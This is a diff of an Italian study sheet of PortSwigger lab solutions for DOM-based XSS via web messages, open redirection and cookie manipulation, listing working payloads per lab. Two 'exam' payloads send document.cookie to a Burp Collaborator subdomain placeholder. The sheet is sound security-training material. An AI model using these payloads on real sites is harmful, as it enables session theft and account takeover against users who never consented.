@@ -89,26 +89,26 @@ git-cola --repo TARGET.web-security-academy.net/
 
 **1. DOM XSS using web messages**
 
-- Segnale: la pagina ha un `window.addEventListener('message', ...)` che passa `e.data` direttamente a un sink come `eval()`, senza controllare `e.origin`.
-- Soluzione: ospitare un iframe che carica la pagina vulnerabile e, al suo `onload`, invia un `postMessage` con il payload, con `targetOrigin` `'*'`.
-- Payload: `<iframe src="https://TARGET/vulnerable-page" onload="this.contentWindow.postMessage('print()','*')">`
+- Segnale: la pagina ha un `window.addEventListener('message', ...)` pensato per gestire annunci, che inserisce `e.data` direttamente nel DOM (es. come `innerHTML` di un `div`), senza controllare `e.origin` né fare encoding del contenuto.
+- Soluzione: ospitare un iframe che carica la pagina vulnerabile e, al suo `onload`, invia un `postMessage` con un tag che sfrutta un gestore di errore per eseguire codice (dato che un `<script>` iniettato via `innerHTML` non si esegue), con `targetOrigin` `'*'`.
+- Payload: `<iframe src="https://TARGET/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">`
 - Link: [DOM XSS using web messages](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages)
 - Step: 1
 
 **2. DOM XSS using web messages and a JavaScript URL**
 
-- Segnale: come sopra, ma il sink non è `eval` diretto: il valore del messaggio viene usato per impostare un URL (es. `location` di un link) che accetta lo schema `javascript:`.
-- Soluzione: invece di codice JS diretto, invia come dato del messaggio una stringa `javascript:` che esegue il payload quando l'URL viene attivato.
-- Payload: `postMessage('javascript:alert(document.domain)','*')`
-- Payload da esame (Burp Collaborator): `postMessage('javascript:document.location="https://YOUR-SUBDOMAIN.burpcollaborator.net/?c="+document.cookie','*')`
+- Segnale: l'event listener contiene un controllo debole con `indexOf()` che cerca la stringa `"http:"` (o `"https:"`) ovunque all'interno del messaggio, prima di passare il valore al sink `location.href`.
+- Soluzione: inviare come dato del messaggio un payload `javascript:` che contiene anche, da qualche parte nella stringa (es. dopo un commento `//`), la sottostringa `"http:"` richiesta dal controllo, così da superarlo e far eseguire l'URL al sink.
+- Payload: `this.contentWindow.postMessage('javascript:print()//http:','*')`
+- Payload da esame (Burp Collaborator): `this.contentWindow.postMessage('javascript:document.location="https://YOUR-SUBDOMAIN.burpcollaborator.net/?c="+document.cookie%2f%2fhttp:','*')`
 - Link: [DOM XSS using web messages and a JavaScript URL](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-a-javascript-url)
 - Step: 1
 
 **3. DOM XSS using web messages and JSON.parse**
 
-- Segnale: l'event listener verifica l'origine ma in modo debole, con `indexOf`, `startsWith` o `endsWith` sulla stringa di origine (es. controlla solo che contenga "normal-website.com"); i dati passano poi per `JSON.parse` prima di arrivare al sink.
-- Soluzione: ospitare l'exploit su un dominio che soddisfa il controllo debole (es. `http://normal-website.com.attacker.net` per `indexOf`/`startsWith`, o `http://malicious-normal-website.com` per `endsWith`), e inviare il payload nel formato JSON che l'app si aspetta.
-- Payload: iframe sul dominio che bypassa il controllo + `postMessage('{"payload":"print()"}', '*')` (adattare la struttura JSON al codice vulnerabile)
+- Segnale: l'event listener fa `JSON.parse(e.data)` prima di usare il risultato: si aspetta una proprietà `type`, e in un `switch` il case corrispondente (es. `"load-channel"`) assegna la proprietà `url` del messaggio al `src` di un iframe interno, senza controllare `e.origin` né validare lo schema dell'URL.
+- Soluzione: ospitare un iframe che carica la pagina vulnerabile e, al suo `onload`, invia un `postMessage` con una stringa JSON che imposta `type` sul valore atteso dal `switch` e `url` su un payload `javascript:`, sfruttando l'assenza di controllo sull'origine e sullo schema per far eseguire il payload come `src` dell'iframe interno.
+- Payload: `this.contentWindow.postMessage('{"type":"load-channel","url":"javascript:print()"}','*')`
 - Link: [DOM XSS using web messages and JSON.parse](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-json-parse)
 - Step: 1
 
@@ -116,18 +116,17 @@ git-cola --repo TARGET.web-security-academy.net/
 
 **4. DOM-based open redirection**
 
-- Segnale: un sink come `location`, `location.href` o `open()` viene impostato leggendo un source controllabile (tipicamente `location.hash`) senza validare che il dominio di destinazione sia quello previsto.
-- Soluzione: costruire un URL con un fragment (`#`) che il codice interpreta come URL completo di redirect verso un dominio esterno.
-- Payload: `https://TARGET/example#https://exploit-server.net` (se il codice controlla solo il prefisso `https:`, puoi anche provare `javascript:` per scalare a code execution)
+- Segnale: un link (es. "Back to Blog") usa una regex come `/url=(https?:\/\/.+)/` per estrarre un parametro `url` dalla query string corrente (`location`) e, se trovato, lo assegna al sink `location.href`; se non trovato, il fallback va alla home.
+- Soluzione: costruire e visitare direttamente un URL che include un parametro `url` puntato all'exploit server: la regex lo estrae e il sink ci reindirizza, senza bisogno di iframe o postMessage.
+- Payload: `https://TARGET/post?postId=4&url=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/`
 - Link: [DOM-based open redirection](https://portswigger.net/web-security/dom-based/open-redirection/lab-dom-open-redirection)
 - Step: 1
 
 **5. DOM-based cookie manipulation**
 
-- Segnale: un source controllabile viene scritto in `document.cookie` senza sanificazione (es. `document.cookie = 'name=' + location.hash.slice(1)`), e quel cookie viene poi riflesso altrove nella pagina senza HTML-encoding.
-- Soluzione: usare il fragment dell'URL per impostare un valore di cookie che contiene a sua volta un payload XSS, sfruttando il fatto che il cookie viene riflesso senza encoding.
-- Payload: `https://TARGET/page#<img src=1 onerror=alert(document.domain)>` (il valore dopo `#` finisce nel cookie e poi viene riflesso ed eseguito)
-- Payload da esame (Burp Collaborator): `https://TARGET/page#<img src=1 onerror=document.location='https://YOUR-SUBDOMAIN.burpcollaborator.net/?c='+document.cookie>` (il valore dopo `#` finisce nel cookie e poi viene riflesso ed eseguito)
+- Segnale: la pagina usa un cookie client-side (es. `lastViewedProduct`) il cui valore è preso dall'URL della pagina visitata (es. una pagina prodotto) e viene poi riflesso altrove (es. in home) senza HTML-encoding.
+- Soluzione: usare un iframe che carica, come primo URL, una pagina prodotto con un payload XSS appeso al parametro (es. dopo una chiusura di attributo), così il valore sporco viene salvato nel cookie; al suo `onload`, reindirizzare subito l'iframe alla home (con un flag per farlo solo una volta), dove il cookie avvelenato viene riflesso ed eseguito.
+- Payload: `<iframe src="https://TARGET/product?productId=1&'><script>print()</script>" onload="if(!window.x){window.x=1;this.src='https://TARGET/'}">`
 - Link: [DOM-based cookie manipulation](https://portswigger.net/web-security/dom-based/cookie-manipulation/lab-dom-cookie-manipulation)
 - Step: 1
 
